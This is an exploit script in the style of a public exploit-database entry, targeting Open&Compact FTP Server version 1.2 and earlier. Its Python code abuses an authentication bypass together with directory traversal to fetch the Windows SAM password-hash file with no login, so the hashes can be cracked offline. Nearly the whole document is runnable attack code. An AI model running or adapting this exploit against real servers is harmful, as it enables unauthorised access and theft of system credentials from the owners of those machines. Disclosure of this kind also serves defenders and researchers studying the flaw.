# Exploit Title: Open&Compact Ftp Server <= 1.2 Auth bypass & directory
traversal sam retrieval
# Date: Aug 7, 2013
# By Wireghoul - http://www.justanotherhacker.com
# Based on Serge Gorbunov&#039;s auth bypass
(http://1337day.com/exploit/description/12783)
# Software Link: http://sourceforge.net/projects/open-ftpd/
# Version: <= 1.2
# Tested on: Windows 7, Windows XP SP3
 
# Abusing authentication bypass in combination with a directory traversal
to grab
# the sam file for offline cracking
import ftplib
import os
 
# Connect to server
ftp = ftplib.FTP( "192.168.58.135" )
ftp.set_pasv( False )
 
# Note that we need no authentication at all!!
 
print ftp.sendcmd( &#039;CWD C:\\\\windows\\\\repair\\\\&#039; )
print ftp.retrbinary(&#039;RETR sam&#039;, open(&#039;sam&#039;, &#039;wb&#039;).write )
 
ftp.quit()

